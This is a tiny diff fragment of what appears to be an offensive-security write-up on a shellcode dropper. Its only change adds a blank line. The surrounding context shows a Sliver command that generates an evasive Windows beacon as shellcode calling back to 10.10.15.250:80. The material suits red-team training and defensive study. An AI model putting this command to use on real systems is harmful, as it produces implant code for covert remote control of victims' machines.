@@ -164,6 +164,7 @@ And the dropper is a simple program that accesses that hosted shellcode, and exe
 ```bash
 sliver > generate beacon --arch amd64 --os windows --http 10.10.15.250:80 --format shellcode --evasion --timeout 300 --seconds 5 --jitter 1
 
+
 ```
 
 
